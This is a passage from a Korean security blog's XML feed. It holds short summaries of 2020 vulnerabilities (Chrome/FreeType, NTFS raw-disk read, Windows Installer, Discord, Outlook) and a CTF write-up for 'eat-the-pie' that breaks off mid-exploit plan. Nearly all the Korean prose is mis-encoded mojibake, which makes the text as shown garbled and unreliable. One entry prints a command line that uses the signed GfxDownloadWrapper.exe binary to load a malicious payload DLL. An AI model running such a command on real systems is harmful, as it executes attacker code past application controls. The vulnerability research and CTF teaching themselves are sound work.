    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>angr</tag>
      
      <tag>ghidra</tag>
      
      <tag>angryghidra</tag>
      
      <tag>symbolic execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-15999: Chrome 0-day, Heap buffer overflow</title>
    <link href="/2020/10/24/fabu1ous/2020-10-24/"/>
    <url>/2020/10/24/fabu1ous/2020-10-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://savannah.nongnu.org/bugs/?59308">Heap buffer overflow due to integer truncation in Load_SBit_Png</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Google Chrome</p><p>Freetype</p><p>libpng</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020-10-21ì¼ Chrome ê¸´ê¸‰ íŒ¨ì¹˜ê°€ ë¦´ë¦¬ì¦ˆ ëìŠµë‹ˆë‹¤. CVE-2020-15999ëŠ” Chromeì—ì„œ í°íŠ¸ë¥¼ ë Œë”ë§ í•  ë•Œ ì‚¬ìš©í•˜ëŠ” ì˜¤í”ˆì†ŒìŠ¤ ë¼ì´ë¸ŒëŸ¬ë¦¬ Freetypeì™€ ê³µì‹ PNG ë¼ì´ë¸ŒëŸ¬ë¦¬ libpng ì‚¬ì´ì—ì„œ ë°œìƒí•˜ëŠ” ì´ìŠˆì…ë‹ˆë‹¤. ê° ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” ì´ë¯¸ì§€ë¡œë¶€í„° 32-bit integerí¬ê¸°ì˜ widthì™€ heightê°’ì„ ì°¸ì¡°í•´ ë™ì‘í•˜ëŠ”ë°, Freetypeì€ 16-bitë¡œ truncate(ì¶•ì†Œ)í•œ ë’¤ bitmap í• ë‹¹ì— ì‚¬ìš©ë˜ëŠ” sizeë¥¼ ê³„ì‚°í•©ë‹ˆë‹¤. ì´ë¯¸ì§€ì˜ widthì™€ heightê°€ 16-bit ë³´ë‹¤ í¬ë‹¤ë©´ Freetypeì—ì„œ í• ë‹¹ëœ bitmapì´ ì‹¤ì œ ì´ë¯¸ì§€ë³´ë‹¤ ì‘ê² ì£ ? ì´  bitmapì„ libpngê°€ ì‚¬ìš©í•˜ë©´ì„œ heap buffer overflowê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>heap bof</tag>
      
      <tag>png</tag>
      
      <tag>freetype</tag>
      
      <tag>libpng</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Bypassing NTFS permissions to read any files as unprivileged user</title>
    <link href="/2020/10/23/l0ch/10-23_1day1line/"/>
    <url>/2020/10/23/l0ch/10-23_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/ioncodes/CVE-2020-16938">POC using Windows API calls</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 2004/Server 2004</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ê¶Œí•œì´ ì—†ëŠ” ì¼ë°˜ ì‚¬ìš©ìê°€ ë¡œì»¬ ë“œë¼ì´ë¸Œì˜ ì „ì²´ ë°ì´í„°ë¥¼ ì—´ëŒí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì˜ POCê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.<br>í•´ë‹¹ ì·¨ì•½ì ì€ ìµœê·¼ ì—…ë°ì´íŠ¸ë¡œ íŒŒí‹°ì…˜, ë³¼ë¥¨ ì¥ì¹˜ì— ëŒ€í•œ ê¶Œí•œì´ ë³€ê²½ë˜ì–´ <code>\\.\PhysicalDrive0\</code>ê²½ë¡œë¡œ ì¥ì¹˜ì— ì ‘ê·¼í•˜ë©´ ê¶Œí•œì„ ìš°íšŒí•´ arbitrary file readê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. </p><p><img src="/2020/10/23/l0ch/10-23_1day1line/image1.png" alt="image1"></p><p>NTFS parserì¸ 7zipìœ¼ë¡œë„ arbitrary file read ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/jonasLyk/status/1316104870987010048">https://twitter.com/jonasLyk/status/1316104870987010048</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>ntfs</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] GfxDownloadWrapper.exe LOLBINì„ ì´ìš©í•œ Assembly Loading</title>
    <link href="/2020/10/22/idioth/gfxdownloadwrapper/"/>
    <url>/2020/10/22/idioth/gfxdownloadwrapper/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bohops.com/2020/10/21/exploring-an-assembly-loading-technique-and-detection-mechanism-for-the-gfxdownloadwrapper-exe-lolbin/">Exploring an Assembly Loading Technique and Detection Mechanism for the GfxDownloadWrapper.exe LOLBIN</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>GfxDownloadWrapper.exeëŠ” ì¸í…” ë¹„ë””ì˜¤ ì¹´ë“œ ë“œë¼ì´ë²„ ì†Œí”„íŠ¸ì›¨ì–´ë¡œ ì¸í…” ê·¸ë˜í”½ ì»¨íŠ¸ë¡¤ íŒ¨ë„ ë° ê²Œì„ ê·¸ë˜í”½ ì„¤ì •ì„ ì§€ì›í•˜ëŠ” .NET ì‘ìš© í”„ë¡œê·¸ë¨ì…ë‹ˆë‹¤. í•´ë‹¹ íŒŒì¼ì€ â€œMicrosoft Windows Third Party Component CA 2012â€ë¡œ ì¸ì¦ë˜ì–´ ìˆìŠµë‹ˆë‹¤. GfxDownloadWrapper.exeëŠ” ì„ì˜ ë‹¤ìš´ë¡œë“œë¥¼ ë°©ì§€í•˜ê¸° ìœ„í•œ ë£¨í‹´ì´ ì¡´ì¬í•˜ì§€ë§Œ ë‚®ì€ ë²„ì „ì—ì„œëŠ” ê·¸ëŸ¬í•œ ê²€ì¦ì´ ì—†ìŠµë‹ˆë‹¤.</p><p><code>main()</code> ì§„ì…ì ì—ì„œ ì–´ì…ˆë¸”ë¦¬ë¥¼ ë¡œë“œí•˜ëŠ” ë¶€ë¶„ì„ ë°œê²¬í•  ìˆ˜ ìˆìœ¼ë©° ì¸ìë¥¼ ì¡°ì‘í•¨ìœ¼ë¡œì¨ ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><ul><li>args[0]: â€œrunâ€ì˜ ë¬¸ìì—´ ê°’</li><li>args[1]: ì–´ì…ˆë¸”ë¦¬ DLL í˜ì´ë¡œë“œ ê²½ë¡œ</li><li>args[2]: í•„ìˆ˜ ì–´ì…ˆë¸”ë¦¬ method ìˆ«ì ë¬¸ìì—´ ê°’<ul><li>0: <code>ApplyRecommendedSettings</code>, 1: <code>RestoreRecommendedSettings</code>, 2: <code>CacheCleanup</code></li></ul></li><li>args[3]: <code>AppData</code> ìƒëŒ€ ê²½ë¡œì— ìˆëŠ” ê²Œì„ ì‹ë³„ì ê°’</li></ul><pre><code class="hljs powershell">GfxDownloadWrapper.exe <span class="hljs-string">&quot;run&quot;</span> <span class="hljs-string">&quot;payload.dll&quot;</span> <span class="hljs-string">&quot;MethodNumber&quot;</span> <span class="hljs-string">&quot;;AppData\\Local\\Intel\\Games\\ì„ì˜ ê°’&quot;</span></code></pre><p>ë”°ë¼ì„œ ì¸ìë¥¼ ë§ì¶°ì¤€ í›„ DLL ê²½ë¡œë¥¼ ì•…ì„± dllë¡œ ì§€ì •í•˜ë©´ ì•…ì„± ì–´ì…ˆë¸”ë¦¬ë¥¼ ë¡œë“œí•œ í›„ ì„±ê³µì ìœ¼ë¡œ ì‹¤í–‰í•˜ê²Œ ë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>living of the land</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16902: Windows Installer EoP</title>
    <link href="/2020/10/21/fabu1ous/2020-10-21/"/>
    <url>/2020/10/21/fabu1ous/2020-10-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-windows-installer-elevation-of-privileges-vulnerability/">SSD Advisory â€“ Windows Installer Elevation of Privileges Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows Installer</p><p><strong>Affected Versions</strong></p><ul><li>Windows 7</li><li>Windows 8</li><li>Windows 10</li><li>Windows 2008</li><li>Windows 2012</li><li>Windows 2016</li><li>Windows 2019</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SSD Secure Disclosure programì— ì œë³´ëœ CVE-2020-16902ì…ë‹ˆë‹¤. Windows InstallerëŠ” ì†Œí”„íŠ¸ì›¨ì–´ì˜ ì„¤ì¹˜, ê´€ë¦¬, ì œê±°ì— ì‚¬ìš©ë˜ëŠ” Windows ì»´í¬ë„ŒíŠ¸ì…ë‹ˆë‹¤. <code>SetSecurity()</code>ì˜ race condition ë¬¸ì œë¡œ ì¸í•´ Windows installerëŠ” íŒ¨ì¹˜ì™€ íŒ¨ì¹˜ ìš°íšŒê°€ ë°˜ë³µë˜ê³  ìˆìŠµë‹ˆë‹¤. ì§€ê¸ˆ ì†Œê°œí•˜ëŠ” CVE-2020-16902ë„ ë§ˆì°¬ê°€ì§€ì…ë‹ˆë‹¤.</p><p>Windows InstallerëŠ” ì„¤ì¹˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë©´ì„œ ë‘ ê°€ì§€ ì‘ì—…ì„ ì¶”ê°€ë¡œ ë³‘í–‰í•©ë‹ˆë‹¤. ì„¤ì¹˜ ì‘ì—…ì˜ ì‹¤íŒ¨ë¥¼ ëŒ€ë¹„í•´ roll back script (<code>.RBS</code>)ë¥¼ ì‘ì„±í•˜ê³ , ì„¤ì¹˜ ì‘ì—… ì¤‘ ì‚­ì œë˜ëŠ” ëª¨ë“  íŒŒì¼ë“¤ì„ ë³µì œí•´ c:\Config.Msiì— ì €ì¥í•©ë‹ˆë‹¤. <code>.RBS</code>ë¥¼ ì‘ì„±í•˜ê¸° ì „ì— íŠ¹ì • ë£¨í‹´ì„ ê±°ì¹˜ëŠ”ë°, ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span> Config.Msi ì† ì„ì‹œíŒŒì¼ë“¤ì„ ìƒì„±<span class="hljs-number">2.</span> Config.Msi ì‚­ì œ<span class="hljs-number">3.</span> Config.Msi ì¡´ì¬ ì—¬ë¶€ í™•ì¸<span class="hljs-number">4.</span> Config.Msi ìƒì„±</code></pre><p>3ë²ˆ ê³¼ì •ì—ì„œ Config.Msi ë””ë ‰í† ë¦¬ê°€ ì—¬ì „íˆ ì¡´ì¬í•œë‹¤ë©´ <code>SetSecurity()</code>ë¥¼ ì‚¬ìš©í•˜ëŠ” ì½”ë“œê°€ ì‹¤í–‰ë˜ë©° ê¸°ì¡´ ì·¨ì•½ì (CVE-2020-1302)ì´ ê·¸ëŒ€ë¡œ ë‹¤ì‹œ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>local</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>system privilege</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Discord Desktop app RCE</title>
    <link href="/2020/10/20/l0ch/Discord_RCE/"/>
    <url>/2020/10/20/l0ch/Discord_RCE/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://mksben.l0.cm/2020/10/discord-desktop-rce.html">Discord Desktop app RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Discord Desktop app</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>node.js ê¸°ë°˜ ì˜¤í”ˆì†ŒìŠ¤ í”„ë ˆì„ì›Œí¬ì¸ Electronìœ¼ë¡œ ê°œë°œëœ Discordì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. </p><p>Electronì˜ <code>BrowserWindow API</code> ì˜µì…˜ ì¤‘ ì½”ë“œ ì‹¤í–‰ ì»¨í…ìŠ¤íŠ¸ë¥¼ ë¶„ë¦¬í•˜ëŠ” <code>contextIsolation</code> ì˜µì…˜ì´ discordì—ì„œëŠ” ë¹„í™œì„±í™” ë¼ìˆì–´ injectionëœ JSê°€ ë‚´ë¶€ í˜ì´ì§€ ì½”ë“œ ì‹¤í–‰ì— ì˜í–¥ì„ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì´ìš©í•˜ë©´ iframe embed XSS ë¥¼ í†µí•´ JavaScript ë‚´ì¥ ë©”ì†Œë“œë¥¼ ì¬ì •ì˜í•  ìˆ˜ ìˆìœ¼ë©° ì´ë•Œ Navigation restrictionì„ ìš°íšŒí•˜ë©´ iframeì„ escapeí•´ ìµœìƒìœ„ ì»¨í…ìŠ¤íŠ¸ì—ì„œ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>xss</tag>
      
      <tag>javascript</tag>
      
      <tag>L0ch</tag>
      
      <tag>electron</tag>
      
      <tag>context isolation</tag>
      
      <tag>discord</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16947: Outlook 365 Remote Command Execution</title>
    <link href="/2020/10/19/idioth/cve-2020-16947/"/>
    <url>/2020/10/19/idioth/cve-2020-16947/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0neb1n/CVE-2020-16947">CVE-2020-16947</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Outlook 365 apps for Enterprise/2016/2019</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlook 365ì—ì„œ ë©”ëª¨ë¦¬ ê°ì²´ì— ëŒ€í•œ ì²˜ë¦¬ë¥¼ ì˜ëª»í•˜ì—¬ RCEê°€ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>HTML ì½˜í…ì¸ ì—ì„œ ASCII ë²”ìœ„ ë°–ì˜ ë¬¸ìì—´ì„ ë³µì‚¬í•  ë•Œ í•´ë‹¹ ë¬¸ìì—´ë“¤ì€ <code>0xfffd</code>ë¡œ êµì²´ë©ë‹ˆë‹¤. ë”°ë¼ì„œ ë³µì‚¬ëœ ë¬¸ìì—´ì˜ í¬ê¸°ê°€ 2ë°°ê°€ ë˜ê¸° ë•Œë¬¸ì— src ë²„í¼ì™€ dst ë²„í¼ì˜ í¬ê¸°ê°€ ê°™ì•„ë„ ë²„í¼ ì˜¤ë²„í”Œë¡œê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.</p><p>í˜„ì¬ ì´ ì·¨ì•½ì ì— ëŒ€í•œ ìì„¸í•œ ê¸°ìˆ ì  ì„¤ëª…ê³¼ exploitì€ ê³µê°œë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>outlook</tag>
      
      <tag>idioth</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>memory corruption</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] SSTF eat-the-pie</title>
    <link href="/2020/10/18/fabu1ous/sstf-eat-the-pie/"/>
    <url>/2020/10/18/fabu1ous/sstf-eat-the-pie/</url>
    
    <content type="html"><![CDATA[<h1 id="ë¨¸ë¦¿ë§"><a href="#ë¨¸ë¦¿ë§" class="headerlink" title="ë¨¸ë¦¿ë§"></a>ë¨¸ë¦¿ë§</h1><p>ë‰´ë¹„ë¶€í„° ê³ ìˆ˜ê¹Œì§€ ëª¨ë‘ ì¦ê¸¸ ìˆ˜ ìˆëŠ” CTFë¼ëŠ” ì†Œê°œê¸€ì„ ë³´ê³  ëŒ€í•™ ë™ì•„ë¦¬ ì‹ ì…ìƒë“¤ì„ ë°ë¦¬ê³  SSTFì— ì¶œì „í–ˆìŠµë‹ˆë‹¤. ì•„ì‰½ê²Œë„ ì¢‹ì€ ì„±ì ì„ ë‚´ì§„ ëª»í–ˆë„¤ìš”. ì‚¬ì‹¤ ì´ write-upì€ ê°™ì´ ì¶œì „í•œ ì‹ ì…ìƒ ì¹œêµ¬ë“¤ì—ê²Œ ë³´ì—¬ì£¼ë ¤ê³  ì‘ì„±í–ˆëŠ”ë° ëª‡ ëª…ì´ë‚˜ ì½ì—ˆì„ì§€â€¦</p><p>CTFë¥¼ ì²˜ìŒ ê²½í—˜í•˜ëŠ” ì¹œêµ¬ë“¤ì´ë¼ ìµœëŒ€í•œ í’€ì–´ì„œ ì„¤ëª…ì„ ì ì—ˆìœ¼ë©°, CTFì— ëŒ€í•œ ì €ì˜ ê²¬í•´ë„ ì¡°ê¸ˆì”© ì„ì—¬ ìˆìŠµë‹ˆë‹¤. eat-the-pieë¥¼ í’€ ë‹¹ì‹œ ì €ì˜ ì‚¬ê³  íë¦„ì„ ì¤‘ì‹¬ìœ¼ë¡œ ì‘ì„±í–ˆê³  ì´ ê¸€ì„ ì½ìœ¼ì‹¤ ë•Œë„ ì´ì ì„ ê¸°ì–µí•´ì£¼ì„¸ìš”.</p><p>[ ì·¨ì•½ì  ]</p><ol><li><p>Memory Leak With Printf</p></li><li><p>Out-Of-Bound</p></li></ol><h1 id="í›‘ì–´ë³´ê¸°"><a href="#í›‘ì–´ë³´ê¸°" class="headerlink" title="í›‘ì–´ë³´ê¸°"></a>í›‘ì–´ë³´ê¸°</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image1.png"></p><p><code>pwnme()</code>ë¼ëŠ” ì´ë¦„ì˜ í•¨ìˆ˜ê°€ ìˆë‹¤. <del>â€œë™ë„¤ ì‚¬ëŒë“¤!!! ì·¨ì•½ì  ì—¬ê¸° ìˆì–´ìš”!!!â€</del></p><p>CTFì—ì„œ ì´ë ‡ê²Œ ì·¨ì•½ì ì˜ ìœ„ì¹˜ë¥¼ ì•Œë ¤ì£¼ëŠ” ë¬¸ì œë“¤ì€ ì£¼ë¡œ ì·¨ì•½ì ì€ ê°„ë‹¨í•˜ì§€ë§Œ exploitìœ¼ë¡œ ì—°ê²°ì‹œí‚¤ëŠ” ê²ƒì´ ì–´ë ¤ìš´ ì»¨ì…‰ì˜ ë¬¸ì œë“¤ì…ë‹ˆë‹¤. eat-the-pieë„ ì´ëŸ° ì»¨ì…‰ì˜ ë¬¸ì œì¸ ê±° ê°™ì£ ?</p><p><del>[ ! ] ì‹¬ì§€ì–´ ë¬¸ì œ ì´ë¦„ë„ PIE ìš°íšŒë¥¼ ì•”ì‹œí•˜ê³  ìˆë‹¤.</del></p><p>ëŒ€ì¶© eat-the-pie ë¬¸ì œë¥¼ ì„¤ëª…í•˜ìë©´,</p><ol><li>stackì— vtableì„ ë§Œë“¤ê³  <code>read()</code>ë¡œ ì…ë ¥ì„ ë°›ìŒ.</li><li><code>read()</code>ë¡œ ë°›ì€ ì…ë ¥ ê°’ì„ ì´ìš©í•´ vtableë¡œë¶€í„° í•¨ìˆ˜ë¥¼ ì°¸ì¡° ì‹¤í–‰.</li></ol><p>ì´ ë‘ ê°€ì§€ ì •ë„ë§Œ ì•Œë©´ ë˜ëŠ” ê°„ë‹¨í•œ í”„ë¡œê·¸ë¨ì…ë‹ˆë‹¤.</p><p>CTF ë¬¸ì œë“¤ì€ ì˜ë„ì ìœ¼ë¡œ ì·¨ì•½ì ì„ ë§Œë“¤ì–´ ë†¨ê¸° ë•Œë¬¸ì— ì§±êµ¬ë¥¼ ì¡°ê¸ˆë§Œ êµ´ë ¤ ë³´ë©´</p><p>ì½”ë“œì—ì„œ ë§ì€ íŒíŠ¸ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>[ ! ] Real worldì™€ ëŒ€ì¡°ë˜ëŠ” í° ì°¨ì´ì ì´ë‹¤.</p><p>ìœ„ ì‚¬ì§„ì—ì„œ í•˜ì´ë¼ì´íŠ¸ ëœ ë¶€ë¶„ì„ ë³´ê³  ìµœëŒ€í•œ ë§ì€ ì •ë³´ë¥¼ ì•Œì•„ë‚´ ë´…ì‹œë‹¤.</p><h1 id="ì·¨ì•½ì -ì˜ˆìƒ-ì •ì -ë¶„ì„"><a href="#ì·¨ì•½ì -ì˜ˆìƒ-ì •ì -ë¶„ì„" class="headerlink" title="ì·¨ì•½ì  ì˜ˆìƒ ( ì •ì  ë¶„ì„ )"></a>ì·¨ì•½ì  ì˜ˆìƒ ( ì •ì  ë¶„ì„ )</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image2.png"></p><ol><li>ì…ë ¥ì„ êµ³ì´ intê°€ ì•„ë‹Œ stringí˜•ìœ¼ë¡œ 16 byteë‚˜ ë°›ëŠ”ë‹¤.</li></ol><p>int( 4 byte )ê°€ ì•„ë‹Œ stringìœ¼ë¡œ 16 byteë‚˜ ì…ë ¥ë°›ëŠ” ê²ƒì€ 12 byteë§Œí¼ ë©”ëª¨ë¦¬ë¥¼ ë‚­ë¹„í•˜ëŠ” ê²ƒì´ê³  ì…ë ¥ë°›ì€ stringì„ intë¡œ ë°”ê¾¸ëŠ” ê³¼ì •ì„ í•œë²ˆ ë” ê±¸ì¹˜ë‹ˆ ê²°ì½” í•©ë¦¬ì ì¸ ì½”ë“œê°€ ì•„ë‹™ë‹ˆë‹¤. ì¦‰, ì·¨ì•½ì ìœ¼ë¡œ ë¹Œë“œ ì—… ë˜ë„ë¡ ì˜ë„ëœ ì½”ë“œì¸ ê±° ê°™ì£ ? <code>atoi()</code> í˜¹ì€ <code>printf()</code> ë“± NULL terminated string í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒë„ ì¤‘ìš”í•œ ì •ë³´ì¸ ê²ƒ ê°™ìŠµë‹ˆë‹¤.</p><ol start="2"><li>ifë¬¸ì˜ ì¡°ê±´ì´ ëª¨ë“  ê²½ìš°ì˜ ìˆ˜ë¥¼ ì»¤ë²„í•˜ì§€ ëª»í•¨.</li></ol><p>indexë¥¼ ì´ìš©í•´ ì°¸ì¡°í•˜ëŠ” ì½”ë“œê°€ ìˆë‹¤ë©´ ê°€ì¥ ë¨¼ì € í™•ì¸í•´ì•¼ í•  ê²ƒì´ ìˆìŠµë‹ˆë‹¤. ë°”ë¡œ, out-of-bound ê°€ëŠ¥ ì—¬ë¶€. ì½”ë“œë¥¼ ì‚´í´ë³´ë©´ ìŒìˆ˜ì— ëŒ€í•œ ì˜ˆì™¸ ì²˜ë¦¬ë¥¼ í•˜ì§€ ì•Šì€ ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‹¬ì§€ì–´ indirect callì— ì‚¬ìš©ë˜ëŠ” indexì˜ out-of-boundë„¤ìš”.</p><p>ê·¸ëŸ¼ ëŒ€ì¶© ì˜ˆìƒí•´ ë³´ë©´ ì·¨ì•½ì ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>NULL terminated stringì˜ ì˜ˆì™¸ ì²˜ë¦¬ ë¶€ì¬ë¡œ PIE ìš°íšŒ</li><li>out-of-boundë¡œ eip ì œì–´</li></ol><p>ì˜ˆìƒì´ ë§ëŠ”ì§€ í•œë²ˆ í™•ì¸í•´ ë´…ì‹œë‹¤.</p><h1 id="Memory-Leak-with-printf"><a href="#Memory-Leak-with-printf" class="headerlink" title="Memory Leak with printf"></a>Memory Leak with printf</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image3.png"></p><p>PIEë¥¼ ìš°íšŒí•˜ëŠ” ë²•ì€ ê°„ë‹¨í•©ë‹ˆë‹¤. binaryì˜ base addressë¥¼ leak í•˜ë©´ ë˜ë‹ˆê¹Œìš”.</p><p>ì˜ˆë¥¼ ë“¤ì–´ func1ì˜ ì£¼ì†Œì¸ <code>0x5655574d</code>ë¥¼ leak í–ˆë‹¤ë©´ <code>0x5655574d</code>ì—ì„œ <code>func1</code>ì˜ offsetì¸ <code>0x74d</code>ë¥¼ ë¹¼ì„œ binary base addressë¥¼ êµ¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image4.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image5.png"></p><p>16 byte ê¸¸ì´ì˜ stringì„ ì…ë ¥í•˜ë©´ vtable ë°”ë¡œ ìœ„ì— ì €ì¥ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ìƒíƒœë¡œ <code>printf()</code> ì‹¤í–‰ì„ íŠ¸ë¦¬ê±°í•˜ë©´ <code>func1 ~ func4</code>ì˜ ì£¼ì†Œë„ ê°™ì´ ì¶œë ¥ë©ë‹ˆë‹¤. <code>printf()</code>ëŠ” NULL terminated stringì„ ë‹¤ë£¨ëŠ” í•¨ìˆ˜ì´ê¸° ë•Œë¬¸ì— NULLì„ ë§Œë‚˜ê¸° ì „ê¹Œì§„ ë©ˆì¶”ì§€ ì•Šê³  ê³„ì† ì¶œë ¥í•œ ê²°ê³¼ì…ë‹ˆë‹¤.</p><h1 id="Out-Of-Bound"><a href="#Out-Of-Bound" class="headerlink" title="Out-Of-Bound"></a>Out-Of-Bound</h1><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image6.png"></p><p>Indirect callì— ì‚¬ìš©ë  ì¸ë±ìŠ¤ì— ë”°ë¼ ìŠ¤íƒ ìƒí™©ì„ ì¶œë ¥í•œ ì‚¬ì§„ì— ë²ˆí˜¸ë¥¼ ìƒˆê²¨ë´¤ìŠµë‹ˆë‹¤. ì¢€ ì „ì— indirect callì—ì„œ ìŒìˆ˜ì— ëŒ€í•œ ì˜ˆì™¸ ì²˜ë¦¬ë¥¼ í•˜ì§€ ì•Šì•„ out-of-boundê°€ ê°€ëŠ¥í•˜ë‹¤ê³  ì„¤ëª…í–ˆìŠµë‹ˆë‹¤. ë§Œì•½ í˜„ ìƒí™©ì—ì„œ -3ì„ ì…ë ¥í•œë‹¤ë©´ eipì— <code>0x42424242</code> ê°€ ë“¤ì–´ê°€ê² ì£ ?</p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image7.png"></p><p><img src="/2020/10/18/fabu1ous/sstf-eat-the-pie/image8.png"></p><p>ì˜ˆìƒëŒ€ë¡œ ì·¨ì•½ì ì€ ì •ë§ ê°„ë‹¨í•©ë‹ˆë‹¤. ì´ì œ exploitì„ í•´ë´…ì‹œë‹¤.</p><h1 id="Exploit-Plan"><a href="#Exploit-Plan" class="headerlink" title="Exploit Plan"></a>Exploit Plan</h1><p>ì£¼ì–´ì§„ ì •ë³´ì™€ ì œì•½ ìƒí™© ë“±ì„ ê³ ë ¤í•˜ë©° ì¶”ê°€ë¡œ í•„ìš”í•œ ì •ë³´ê°€ ìˆëŠ”ì§€ ì²´í¬í•´ë´…ì‹œë‹¤.</p><ol><li><code>system()</code>ì„ ë°”ì´ë„ˆë¦¬ì—ì„œ ì‚¬ìš©í•¨.<ul><li>Arbitrary Write(AW)ê°€ ê°€ëŠ¥í•˜ë‹¤ë©´ bssì— â€œ/bin/shâ€ì„ ë„£ì–´ì£¼ê¸°ë§Œ í•˜ë©´ ë¨</li></ul></li><li>Libc ì£¼ì†Œë¥¼ leak í•˜ê¸° ë²ˆê±°ë¡œì›€ </li><li>PIEê°€ ìˆëŠ” ìƒí™©ì—ì„œ stack ì£¼ì†Œë¥¼ leak 